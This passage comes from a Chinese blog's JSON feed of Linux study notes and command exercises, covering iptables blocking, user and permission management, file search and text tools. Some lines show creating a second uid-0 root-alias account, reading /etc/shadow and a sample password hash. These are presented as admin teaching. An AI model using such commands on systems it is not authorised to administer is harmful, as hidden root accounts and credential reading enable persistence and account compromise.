的命令</span>\n\niptables -I INPUT -s <span>124.45</span>.0.0/16 -j DROP\n<span># 封 IP 段即从 123.45.0.1 到 123.45.255.254 的命令</span>\n\niptables -I INPUT -s <span>123.45</span>.6.0/24 -j DROP\n<span># 封 IP 段即从 123.45.6.1 到 123.45.6.254 的命令</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h3 id=\"保存当前设置的规则\" tabindex=\"-1\"> 保存当前设置的规则</h3>\n<div><pre><code>/etc/rc.d/init.d/iptables save\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><p><img src=\"/assets/iptables-4.png\" alt=\"iptables 的设置与查看\"></p>\n<br>\n<p><img src=\"/assets/iptables-5.png\" alt=\"iptables 的设置与查看\"></p>\n",
      "image": "https://vxhly.github.io/assets/iptables-1.png",
      "date_published": "2016-10-27T10:00:55.000Z",
      "date_modified": "2022-06-11T12:24:01.000Z",
      "authors": [
        {
          "name": "星火燎原@vxhly"
        }
      ],
      "tags": [
        "liunx"
      ]
    },
    {
      "title": "Liunx 学习笔记（五）基础操作",
      "url": "https://vxhly.github.io/views/liunx/liunx-basic-operation.html",
      "id": "https://vxhly.github.io/views/liunx/liunx-basic-operation.html",
      "summary": "前言\n本篇是 Liunx 的学习笔记系列第五篇, 这一篇将介绍 Liunx 的基础操作。很多人觉得 Liunx 非常难学, 但不其然, 只要掌握一些基础的命令操作, Liunx 还是非常好上手的。\n\n",
      "content_html": "<div><p>前言</p>\n<p>本篇是 Liunx 的学习笔记系列第五篇, 这一篇将介绍 Liunx 的基础操作。很多人觉得 Liunx 非常难学, 但不其然, 只要掌握一些基础的命令操作, Liunx 还是非常好上手的。</p>\n</div>\n\n<h2 id=\"liunx-终端\" tabindex=\"-1\"> Liunx 终端</h2>\n<h3 id=\"终端和控制台的区别\" tabindex=\"-1\"> 终端和控制台的区别</h3>\n<p>终端 (Terminal) 和控制台 (Console) 是有区别的</p>\n<p>终端本质上是对应着 Liunx 上的 <code>/dev/tty</code> 设备, Liunx 的多用户登陆就是通过不同的 <code>/dev/tty</code> 设备完成的, Liunx 默认提供了 6 个纯命令行界面的 <code>&quot;terminal&quot;</code> （准确的说这里应该是 6 个 <code>virtual consoles</code> ）来让用户登录, 你可以通过使用 <code>[Ctrl]+[Alt]+[F1]～[F6]</code> 进行切换, 不过在在线实验环境中可能无法切换, 因为特殊功能按键会被你主机系统劫持。当你切换到其中一个终端后想要切换回图形界面, 你可以按下 <code>[Ctrl]+[Alt]+[F7]</code> 来完成</p>\n<h3 id=\"shell\" tabindex=\"-1\"> Shell</h3>\n<p>Shell 是指&quot;提供给使用者使用界面&quot;的软件（命令解析器）, 类似于 DOS 下的 command (命令行)和后来的 cmd.exe。之所以被称作 shell 是因为它隐藏了操作系统底层的细节。就像是个 Shell (壳), 有壳就有核, 这里的核就是指的 UNIX/Liunx 内核。</p>\n<h3 id=\"重要的快捷键-只列出常用的\" tabindex=\"-1\"> 重要的快捷键（只列出常用的）</h3>\n<table>\n<thead>\n<tr>\n<th>按键</th>\n<th>作用</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><strong>Tab</strong></td>\n<td>进行命令补全</td>\n</tr>\n<tr>\n<td><strong>Ctrl+c</strong></td>\n<td>强行终止当前程序（最常用, 你可以放心它并不会使终端退出)</td>\n</tr>\n<tr>\n<td><strong>Ctrl+d</strong></td>\n<td>这个才是强制退出终端的(不用敲 exit 了)</td>\n</tr>\n<tr>\n<td><strong>Ctrl+s</strong></td>\n<td>暂定当前程序, 暂停后按下任意键恢复运行(网络交互有用)</td>\n</tr>\n<tr>\n<td><strong>Ctrl+z</strong></td>\n<td>将当前程序放到后台运行, 恢复到前台为命令 fg</td>\n</tr>\n<tr>\n<td><strong>Ctrl+u</strong></td>\n<td>删除光标所在的整行</td>\n</tr>\n<tr>\n<td><strong>Ctrl+l</strong></td>\n<td>清屏, 最常用</td>\n</tr>\n<tr>\n<td><strong>Ctrl+k</strong></td>\n<td>删除从光标所在位置到行末</td>\n</tr>\n<tr>\n<td><strong>Alt+Backspace</strong></td>\n<td>向前删除一个单词</td>\n</tr>\n<tr>\n<td><strong>Shift+PgUp</strong></td>\n<td>将终端显示向上滚动</td>\n</tr>\n<tr>\n<td><strong>Shift+PgDn</strong></td>\n<td>将终端显示向下滚动</td>\n</tr>\n</tbody>\n</table>\n<h3 id=\"使用通配符\" tabindex=\"-1\"> 使用通配符</h3>\n<p><code>举例:</code></p>\n<div><pre><code><span>touch</span> love_<span>{</span><span>1</span><span>..</span><span>10</span><span>}</span>_Liunx.txt\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><p><img src=\"/assets/liunx-basic-1.png\" alt=\"使用通配符\"></p>\n<h3 id=\"shell-常用通配符\" tabindex=\"-1\"> shell 常用通配符</h3>\n<table>\n<thead>\n<tr>\n<th>通配符</th>\n<th>作用</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><strong>*</strong></td>\n<td>匹配 0 或多个字符</td>\n</tr>\n<tr>\n<td><strong>?</strong></td>\n<td>匹配任意一个字符</td>\n</tr>\n<tr>\n<td><strong>[list]</strong></td>\n<td>匹配 list 中的任意单一字符</td>\n</tr>\n<tr>\n<td><strong>[!list]</strong></td>\n<td>匹配 除 list 中的任意单一字符以外的字符</td>\n</tr>\n<tr>\n<td><strong>[c1-c2]</strong></td>\n<td>匹配 c1-c2 中的任意单一字符 如: <code>[0-9] [a-z]</code></td>\n</tr>\n<tr>\n<td><strong>{string1, string2, ...}</strong></td>\n<td>匹配 sring1 或 string2 (或更多)其一字符串</td>\n</tr>\n<tr>\n<td><strong>{c1..c2}</strong></td>\n<td>匹配 c1-c2 中全部字符 如 <code>{1..10}</code></td>\n</tr>\n</tbody>\n</table>\n<h2 id=\"命令手册速查\" tabindex=\"-1\"> 命令手册速查</h2>\n<p>Liunx 下命令成千上百, 有个速查手册也是不错的, <a href=\"http://man.linuxde.net/\" target=\"_blank\" rel=\"noopener noreferrer\">Liunx 命令速查手册</a></p>\n<h2 id=\"liunx-用户管理\" tabindex=\"-1\"> Liunx 用户管理</h2>\n<h3 id=\"获取当前登录的用户\" tabindex=\"-1\"> 获取当前登录的用户</h3>\n<div><pre><code><span>who</span> <span># 获取当前登录的所有用户信息（包括远程登录）</span>\n<span>whoami</span> <span># 获取当前登录的用户名</span>\n<span>who</span> am i <span># 获取当前登录用户的信息</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div></div></div><p><img src=\"/assets/liunx-basic-2.png\" alt=\"获取当前登录的用户\"></p>\n<div><p>提示</p>\n<p>第一列表示打开当前伪终端的用户的用户名<br> 第二列的 pts/0 中 pts 表示伪终端, 所谓伪是相对于 /dev/tty 设备而言的, 使用 <code>[Ctrl]+[Alt]+[F1]～[F7]</code> 进行切换的 /dev/tty 设备, 这是&quot;真终端&quot;, 伪终端就是当你在图形用户界面使用 /dev/tty7 时每打开一个终端就会产生一个伪终端, pts/0 后面那个数字就表示打开的伪终端序号<br> 第三列则表示当前伪终端的启动时间</p>\n</div>\n<h3 id=\"创建用户、切换用户\" tabindex=\"-1\"> 创建用户、切换用户</h3>\n<div><pre><code>adduser <span>[</span>userName<span>]</span>            <span># 通过询问的方式进行新增用户</span>\n<span>useradd</span> -m <span>[</span>userName<span>]</span>         <span># 通过自行添加参数方式新增用户</span>\n<span>useradd</span> -u <span>0</span> -o <span>[</span>userName<span>]</span>    <span># 添加 uid 为 0 的用户,即 root 用户的别名,拥有 root 的权限</span>\n<span>userdel</span> -r <span>[</span>userName<span>]</span>         <span># 永久删除用户</span>\n<span>id</span>                          <span># 查看用户的 uid 或 gid 等信息</span>\n<span>su</span> -                        <span># 切换到 root 用户</span>\n<span>su</span> - <span>[</span>userName<span>]</span>             <span># 切换某一个用户</span>\n<span>passwd</span>                      <span># 为当前用户设置密码</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><div><p>提示</p>\n<p>用户信息将被保存至 <code>/etc/passwd</code>, 用户密码将被保存至 <code>/etc/shadow</code><br> 使用 root 用户可以修改其内容, 只需使用 wq!, 强制保存就好</p>\n</div>\n<h3 id=\"创建组、添加组成员\" tabindex=\"-1\"> 创建组、添加组成员</h3>\n<div><pre><code><span>groupadd</span> <span>[</span>groupName<span>]</span>                <span># 添加用户组</span>\n<span>groupdel</span> <span>[</span>groupName<span>]</span>                <span># 删除用户组</span>\n<span>usermod</span> -G <span>[</span>groupName<span>]</span> <span>[</span>userName<span>]</span>     <span># 将用户 添加至用户组,-G 附属组,-g 主属组</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div></div></div><div><p>提示</p>\n<p>组信息将被保存至 <code>/etc/group</code>, 组密码将保存至 <code>/etc/gshadow</code><br> 使用 root 用户可以修改其内容, 只需使用 wq!, 强制保存就好</p>\n</div>\n<h3 id=\"禁用和解锁用户\" tabindex=\"-1\"> 禁用和解锁用户</h3>\n<h4 id=\"passwd-方法\" tabindex=\"-1\"> passwd 方法</h4>\n<div><pre><code><span>passwd</span> -l <span>[</span>userName<span>]</span>    <span>#禁用</span>\n<span>passwd</span> -u <span>[</span>userName<span>]</span>    <span>#解锁</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div></div></div><h4 id=\"修改-etc-shadow-文件-root-用户\" tabindex=\"-1\"> 修改 <code>/etc/shadow</code> 文件（root 用户）</h4>\n<div><pre><code><span>vim</span> /etc/shadow\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><p>禁用则在密码位前手工添加 ! （启用删除 ! 即可）, 如:</p>\n<div><pre><code>test:<span>!</span><span>$1</span><span>$afiVSYfG</span><span>$utdc2qWLNrqNcy63Ca8301</span>:16998:0:99999:7:::\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><p>或</p>\n<div><pre><code>test:<span>!</span><span>!</span><span>$1</span><span>$afiVSYfG</span><span>$utdc2qWLNrqNcy63Ca8301</span>:16998:0:99999:7:::\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><p>使用 <code>:wq!</code> 强制保存</p>\n<h4 id=\"usermod-方法\" tabindex=\"-1\"> usermod 方法</h4>\n<div><pre><code><span>usermod</span> -L <span>[</span>userName<span>]</span>    <span>#禁用</span>\n<span>usermod</span> -U <span>[</span>userName<span>]</span>    <span>#解锁</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div></div></div><h3 id=\"设置用户一登录就要修改密码\" tabindex=\"-1\"> 设置用户一登录就要修改密码</h3>\n<div><pre><code>chage -d <span>0</span> <span>[</span>userName<span>]</span>\n<span># 这个命令其实是把密码修改日期归 0 了 （/etc/shadow 文件第 3 个字段）</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div></div></div><h3 id=\"查看当前登录的用户的环境变量\" tabindex=\"-1\"> 查看当前登录的用户的环境变量</h3>\n<div><pre><code><span>env</span>\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><h2 id=\"liunx-文件权限\" tabindex=\"-1\"> Liunx 文件权限</h2>\n<h3 id=\"查看文件权限\" tabindex=\"-1\"> 查看文件权限</h3>\n<div><pre><code><span>ls</span> -l       <span># 可以简写成 ll,注意有些版本的 Liunx 不支持</span>\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><h4 id=\"权限介绍\" tabindex=\"-1\"> 权限介绍</h4>\n<p><img src=\"/assets/liunx-basic-3.png\" alt=\"权限介绍\"></p>\n<br>\n<p><img src=\"/assets/liunx-basic-4.png\" alt=\"权限介绍\"></p>\n<div><p>提示</p>\n<p>通常我们使用数字表示权限, 4 为读取权限, 2 为写入权限, 1 为执行权限。所以权限为 777 的为最高权限</p>\n</div>\n<h3 id=\"权限的设置\" tabindex=\"-1\"> 权限的设置</h3>\n<div><pre><code><span>chmod</span> <span>777</span> text.txt    <span># 设置最高权限</span>\n<span>chmod</span> o+w text.txt    <span># 为其他用户添加写权限</span>\n<span>chmod</span> g-r text.txt    <span># 为组中的所有用户去除读权限</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div></div></div><h3 id=\"修改所属者和所属组\" tabindex=\"-1\"> 修改所属者和所属组</h3>\n<div><pre><code><span>chown</span> root text.txt         <span># 修改所属者</span>\n<span>chgrp</span> text text.txt         <span># 修该所属组</span>\n<span>chown</span> root:text text.txt    <span># 修改所属者和所属组</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div></div></div><h2 id=\"liunx-文件的基本操作-很重要且很常用\" tabindex=\"-1\"> Liunx 文件的基本操作（很重要且很常用）</h2>\n<h3 id=\"文件操作\" tabindex=\"-1\"> 文件操作</h3>\n<div><pre><code><span>touch</span> <span>test</span>                            <span># 新建一个空文件</span>\n<span>echo</span> <span>\"this is a text\"</span> <span>></span> test.txt      <span># 输出内容重定向到文件,> 覆盖操作</span>\n<span>echo</span> <span>\"this is a text\"</span> <span>>></span> test.txt     <span># 输出内容重定向到文件,>> 追加操作</span>\n<span>rm</span> -f test.txt                        <span># 删除文件</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div></div></div><h3 id=\"目录操作\" tabindex=\"-1\"> 目录操作</h3>\n<div><pre><code><span>mkdir</span> <span>[</span>folderName<span>]</span>                        <span># 新建目录</span>\n<span>mkdir</span> -p <span>[</span>path<span>]</span>/<span>[</span>folderName<span>]</span>              <span># 若父级目录不存在,则一起创建</span>\n<span>rm</span> -rf <span>[</span>path<span>]</span>/<span>[</span>folderName<span>]</span>                <span># 删除目录</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div></div></div><h3 id=\"复制操作\" tabindex=\"-1\"> 复制操作</h3>\n<div><pre><code><span>cp</span> <span>test</span> <span>[</span>path<span>]</span>/<span>[</span>folderName<span>]</span>                       <span># 复制文件爱内</span>\n<span>cp</span> -r <span>[</span>path<span>]</span>/<span>[</span>folderName<span>]</span> <span>[</span>path<span>]</span>/<span>[</span>folderName<span>]</span>     <span># 复制目录</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div></div></div><h3 id=\"移动、重命名操作\" tabindex=\"-1\"> 移动、重命名操作</h3>\n<div><pre><code><span>mv</span> <span>[</span>fileName<span>]</span> <span>[</span>path<span>]</span>/<span>[</span>folderName<span>]</span>           <span># 移动文件</span>\n<span>mv</span> <span>[</span>fileName1<span>]</span> <span>[</span>fileName2<span>]</span>                  <span># 重命名</span>\n\n<span># 先用通配符批量创建 5 个文件</span>\n<span>touch</span> file<span>{</span><span>1</span><span>..</span><span>5</span><span>}</span>.txt\n<span># 批量将这 5 个后缀为 .txt 的文本文件重命名为以 .c 为后缀的文件</span>\n<span>rename</span> <span>'s/\\.txt/\\.c/'</span> *.txt\n<span># 批量将这 5 个文件,文件名改为大写</span>\n<span>rename</span> <span>'y/a-z/A-Z/'</span> *.c\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h3 id=\"查看文件\" tabindex=\"-1\"> 查看文件</h3>\n<div><pre><code><span>cat</span> /etc/passwd\n<span>tail</span> -n <span>5</span> /etc/passwd       <span># 只输出文件的末尾 5 行</span>\n<span>file</span> /bin/ls                <span># 可以查看文件的类型</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div></div></div><p>适用于快速查看文件, 都是用来打印文件内容到标准输出（终端), 相同的命令有: cat (正序)、tac (倒序)、tail(按要求输出)和 nl 命令</p>\n<h2 id=\"搜索文件\" tabindex=\"-1\"> 搜索文件</h2>\n<h3 id=\"whereis\" tabindex=\"-1\"> whereis</h3>\n<p>直接从数据库中查询简单快速</p>\n<div><pre><code><span>whereis</span> <span>ls</span>      <span># 直接从数据库中查询简单快速</span>\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><h3 id=\"locate\" tabindex=\"-1\"> locate</h3>\n<p>快而全</p>\n<p>通过 <code>&quot;/var/lib/mlocate/mlocate.db&quot;</code> 数据库查找, 不过这个数据库也不是实时更新的, 系统会使用定时任务每天自动执行 updatedb 命令更新一次, 所以有时候你刚添加的文件, 它可能会找不到, 你就得自己执行一次 updatedb 命令（在我们的环境中必须先执行一次该命令）。它可以用来查找指定目录下的不同文件类型,</p>\n<p>如: 查找 <code>/etc</code> 下所有以 sh 开头的文件</p>\n<div><pre><code><span>locate</span> /etc/sh\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><p>注意, 它不只是在 etc 目录下查找并会自动递归子目录进行查找 查找 <code>/usr/share/</code> 下所有 jpg 文件</p>\n<div><pre><code><span>locate</span> /usr/share/*.jpg\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><p>注意要添加 <strong>*</strong> 号前面的反斜杠转义, 否则会无法找到 只统计数目可以加上 -c 参数, -i 参数忽略大小写进行查找, whereis 的 -b, -m, -s 同样适用</p>\n<h3 id=\"which\" tabindex=\"-1\"> which</h3>\n<p>避免了进入程序进行测试, 很有用</p>\n<p>which 本身是 shell 内建的一个命令, 我们通常使用 which 来确定是否安装了某个指定的软件, 因为它只从 PATH 环境变量指定的路径中去搜索命令</p>\n<div><pre><code><span>which</span> <span>man</span>\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><h3 id=\"find\" tabindex=\"-1\"> find</h3>\n<p>太精和太细, 知道前面的命令就已经足够了</p>\n<p>find 应该是这几个命令中最强大的了, 它不但可以通过文件类型、文件名进行查找而且可以根据文件的属性（如文件的时间戳, 文件的权限等）进行搜索</p>\n<p>举个栗子: 在指定目录下搜索指定文件名的文件</p>\n<div><pre><code><span>find</span> /etc/ -name interfaces\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><p>注意 find 命令的路径是作为第一个参数的, 基本命令格式为 <code>find [path] [option] [action]</code></p>\n<h2 id=\"简单文件系统操作\" tabindex=\"-1\"> 简单文件系统操作</h2>\n<h3 id=\"查看磁盘和目录的容量\" tabindex=\"-1\"> 查看磁盘和目录的容量</h3>\n<h4 id=\"使用-df-命令查看磁盘的容量\" tabindex=\"-1\"> 使用 df 命令查看磁盘的容量</h4>\n<div><pre><code><span>df</span>            <span># 以 blocks 的大小展示</span>\n<span>df</span> -h         <span># 人性化输出,以更易读的方式展示</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div></div></div><h4 id=\"使用-du-命令查看目录的容量\" tabindex=\"-1\"> 使用 du 命令查看目录的容量</h4>\n<div><pre><code><span># 默认同样以blocks的大小展示</span>\n<span>du</span>\n<span># 加上-h参数,以更易读的方式展示</span>\n<span>du</span> -h\n\n<span># 只查看1级目录的信息</span>\n<span>du</span> -h -d <span>0</span> ~\n<span># 查看2级$ du -h -d 1 ~</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h3 id=\"挂载光盘和卸载光盘\" tabindex=\"-1\"> 挂载光盘和卸载光盘</h3>\n<div><pre><code><span>mount</span> /dev/cdrom /mnt/cdrom     <span># 挂载光盘</span>\n<span>umount</span> /dev/cdrom               <span># 卸载光盘</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div></div></div><h3 id=\"wc-命令-简单小巧的计数工具\" tabindex=\"-1\"> wc 命令, 简单小巧的计数工具</h3>\n<div><pre><code><span>wc</span> /etc/passwd\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><p>分别只输出行数、单词数、字节数、字符数和输入文本中最长一行的字节数</p>\n<div><pre><code><span># 行数</span>\n<span>wc</span> -l /etc/passwd\n\n<span># 单词数</span>\n<span>wc</span> -w /etc/passwd\n\n<span># 字节数</span>\n<span>wc</span> -c /etc/passwd\n\n<span># 字符数</span>\n<span>wc</span> -m /etc/passwd\n\n<span># 最长行字节数</span>\n<span>wc</span> -L /etc/passwd\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><div><p>注意</p>\n<p>对于西文字符来说, 一个字符就是一个字节, 但对于中文字符一个汉子是大于 2 个字节的, 具体数目是由字符编码决定的</p>\n</div>\n<h2 id=\"常用的文本处理命令\" tabindex=\"-1\"> 常用的文本处理命令</h2>\n<h3 id=\"tr-命令\" tabindex=\"-1\"> tr 命令</h3>\n<p>tr 命令可以用来删除一段文本信息中的某些文字。或者将其进行转换 使用方式:</p>\n<div><pre><code><span>tr</span> <span>[</span>option<span>]</span><span>..</span>.SET1 <span>[</span>SET2<span>]</span>\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><p>常用选项:</p>\n<table>\n<thead>\n<tr>\n<th>选项</th>\n<th>说明</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><strong>-d</strong></td>\n<td>删除和 set1 匹配的字符, 注意不是全词匹配也不是按字符顺序匹配</td>\n</tr>\n<tr>\n<td><strong>-s</strong></td>\n<td>去除 set1 指定的在输入文本中连续并重复的字符</td>\n</tr>\n</tbody>\n</table>\n<p><code>操作举例: </code></p>\n<div><pre><code><span># 删除 \"hello shiyanlou\" 中所有的'o','l','h'</span>\n<span>echo</span> <span>'hello shiyanlou'</span> <span>|</span> <span>tr</span> -d <span>'olh'</span>\n\n<span># 将\"hello\" 中的ll,去重为一个l</span>\n<span>echo</span> <span>'hello'</span> <span>|</span> <span>tr</span> -s <span>'l'</span>\n\n<span># 将输入文本,全部转换为大写或小写输出</span>\n<span>cat</span> /etc/passwd <span>|</span> <span>tr</span> <span>'[:lower:]'</span> <span>'[:upper:]'</span>\n<span># 上面的'[:lower:]' '[:upper:]'你也可以简单的写作'[a-z]' '[A-Z]',当然反过来将大写变小写也是可以的</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h3 id=\"col-命令\" tabindex=\"-1\"> col 命令</h3>\n<p>col 命令可以将 Tab 换成对等数量的空格建, 或反转这个操作. 用来格式化代码超爽 使用方式:</p>\n<div><pre><code>col <span>[</span>option<span>]</span>\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><p>常用的选项有:</p>\n<table>\n<thead>\n<tr>\n<th>选项</th>\n<th>说明</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><strong>-x</strong></td>\n<td>将 Tab 转换为空格</td>\n</tr>\n<tr>\n<td><strong>-h</strong></td>\n<td>将空格转换为 Tab（默认选项）</td>\n</tr>\n</tbody>\n</table>\n<p><code>操作举例: </code></p>\n<div><pre><code><span># 查看/etc/protocols中的不可见字符,可以看到很多^I,这其实就是Tab键转义成可见字符的符号</span>\n<span>cat</span> -A /etc/protocols\n\n<span># 使用col -x将/etc/protocols中的Tab转换为空格,然后再使用cat查看,你发现^I不见了</span>\n<span>cat</span> /etc/protocols <span>|</span> col -x <span>|</span> <span>cat</span> -A\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div><div></div></div></div><h2 id=\"福利-使用-wget-克隆网站\" tabindex=\"-1\"> 福利-使用 wget 克隆网站</h2>\n<div><pre><code><span>wget</span> -c -m -k -np -p -E -U Mozilla –no-check-certificate <span>[</span>URL<span>]</span>\n</code></pre><div aria-hidden=\"true\"><div></div></div></div>",
      "image": "https://vxhly.github.io/assets/liunx-basic-1.png",
      "date_published": "2016-09-15T16:09:27.000Z",
      "date_modified": "2022-06-11T12:24:01.000Z",
      "authors": [
        {
          "name": "星火燎原@vxhly"
        }
      ],
      "tags": [
        "liunx"
      ]
    },
    {
      "title": "Liunx 命令练习",
      "url": "https://vxhly.github.io/views/liunx/liunx-command-testing.html",
      "id": "https://vxhly.github.io/views/liunx/liunx-command-testing.html",
      "summary": "前言\n简单的一些 Liunx 命令练习。\n\n",
      "content_html": "<div><p>前言</p>\n<p>简单的一些 Liunx 命令练习。</p>\n</div>\n\n<h2 id=\"【文件的压缩和解压缩】\" tabindex=\"-1\"> 【文件的压缩和解压缩】</h2>\n<div><p>需求</p>\n<p>使用 tar 命令将 <code>/etc</code> 目录打包至 <code>/tmp</code> 目录下（仅打包, 不压缩）, 将打包后的文件, 以 <code>gzip</code> 方式压缩【共两条命令】</p>\n</div>\n<div><pre><code><span>tar</span> -cvf /tmp/etc.tar /etc\n<span>gzip</span> /tmp/etc.tar\n</code></pre><div aria-hidden=\"true\"><div></div><div></div></div></div><h2 id=\"【创建软链接和硬链接】\" tabindex=\"-1\"> 【创建软链接和硬链接】</h2>\n<div><p>需求</p>\n<p>给系统文件 <code>/etc/profile</code> 创建一个软链接 <code>lnsprofile</code> 和一个硬链接 <code>lnhprofile</code>【共两条命令】</p>\n</div>\n<div><pre><code><span>ln</span> -s /etc/profile ./lnsprofile\n<span>ln</span> /etc/profile ./lnhprofile\n</code></pre><div aria-hidden=\"true\"><div></div><div></div></div></div><h2 id=\"【为文件设置隐藏属性】\" tabindex=\"-1\"> 【为文件设置隐藏属性】</h2>\n<div><p>需求</p>\n<p>为文件 <code>test</code> 设置隐藏属性, 要求其只能无法写入数据, 也无法删除它【共一条命令】</p>\n</div>\n<div><pre><code>chattr +a <span>test</span>\n<span># or</span>\nchattr +i <span>test</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div></div></div><h2 id=\"【创建目录和删除目录】\" tabindex=\"-1\"> 【创建目录和删除目录】</h2>\n<div><p>需求</p>\n<p>创建目录 <code>./test/2017/6/25</code>, 并切换目录至 <code>./test/2017/6</code>, 删除空目录 ./25（不能使用 rm -rf）【共三条命令】</p>\n</div>\n<div><pre><code><span>mkdir</span> -p ./test/2017/6/25\n<span>cd</span> ./test/2017/6\n<span>rmdir</span> ./25\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div></div></div><div><p>需求</p>\n<p>查看当前所在的目录【共一条命令】</p>\n</div>\n<div><pre><code><span>pwd</span>\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><div><p>需求</p>\n<p>查看当前目录下有哪些文件或目录（包括隐藏文件）【共一条命令】</p>\n</div>\n<div><pre><code><span>ls</span> -la\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><h2 id=\"【普通用户提权】\" tabindex=\"-1\"> 【普通用户提权】</h2>\n<div><p>需求</p>\n<p>普通用户切换成 root 超级用户【举例两个】</p>\n</div>\n<div><pre><code><span>sudo</span> <span>su</span>\n<span># or</span>\n<span>su</span> -\n<span># or</span>\n<span>sudo</span> -s\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div><div></div></div></div><h2 id=\"【创建用户和用户组】\" tabindex=\"-1\"> 【创建用户和用户组】</h2>\n<div><p>需求</p>\n<p>创建一个用户 stuxxx, 其家目录为 <code>/home/stu</code>, 备注信息为 &quot;this is student, ID is xxxxxx&quot;, 登录 shell 为 <code>/sbin/nologi</code>n, 并设置登陆密码【共三条命令】</p>\n</div>\n<div><pre><code><span>useradd</span> -d /home/stu -m -c <span>\"this is student,ID is xxxxxx\"</span> -s /sbin/nologin -p <span>\"\"</span> stuxxx\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><div><p>需求</p>\n<p>创建一个 uid 为 0 的用户 student【共一条命令】</p>\n</div>\n<div><pre><code><span>useradd</span>  -o  -u  <span>0</span>  student\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><div><p>需求</p>\n<p>创建用户组 test【共一条命令】</p>\n</div>\n<div><pre><code><span>groupadd</span> <span>test</span>\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><h2 id=\"【用户管理】\" tabindex=\"-1\"> 【用户管理】</h2>\n<div><p>需求</p>\n<p>锁定用户 stuxxx, 使其不能登陆系统【共一条命令】</p>\n</div>\n<div><pre><code><span>usermod</span> -s /sbin/nologin stu2xxx\n<span># or</span>\n<span>passwd</span> -l stu2xxx\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div></div></div><h2 id=\"【新建文件】\" tabindex=\"-1\"> 【新建文件】</h2>\n<div><p>需求</p>\n<p>新建一个文件 file, 添加内容 &quot;this is text, ID is xxxxxx&quot;, 设置其权限为 000【共三条命令】</p>\n</div>\n<div><pre><code><span>touch</span> <span>file</span>\n<span>echo</span> <span>\"this is text,ID is xxxxxx\"</span> <span>></span> <span>file</span>\n<span>chmod</span> 000 <span>file</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div></div></div><h2 id=\"【文件的快速搜索】\" tabindex=\"-1\"> 【文件的快速搜索】</h2>\n<div><p>需求</p>\n<p>在 <code>/etc</code> 目录下搜索 apache、ssh、ftp 的配置文件【共三条命令】</p>\n</div>\n<div><pre><code><span>find</span> /etc -type f -iname <span>'*apache2.*'</span>\n<span>find</span> /etc -type f -iname <span>'*ssh.*'</span>\n<span>find</span> /etc -type f -iname <span>'*ftp.*'</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div></div></div><h2 id=\"【文件的查看和快速定位】\" tabindex=\"-1\"> 【文件的查看和快速定位】</h2>\n<div><p>需求</p>\n<p>查看 <code>/etc/passwd</code> 文件和 <code>/etc/shadow</code> 文件, 并使用 grep 过滤出 student 用户的信息【共两条命令】</p>\n</div>\n<div><pre><code><span>cat</span> /etc/passwd <span>|</span> <span>grep</span> <span>'student'</span>\n<span>cat</span> /etc/shadow <span>|</span> <span>grep</span> <span>'student'</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div></div></div><h2 id=\"【更改目录或者文件的属性】\" tabindex=\"-1\"> 【更改目录或者文件的属性】</h2>\n<div><p>需求</p>\n<p>将目录 <code>./test/\\*</code> 的所有者和所有组修改成 student【共一条命令】</p>\n</div>\n<div><pre><code><span>chown</span> -R student:student ./test/\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><h2 id=\"【系统环境变量的查看与配置】\" tabindex=\"-1\"> 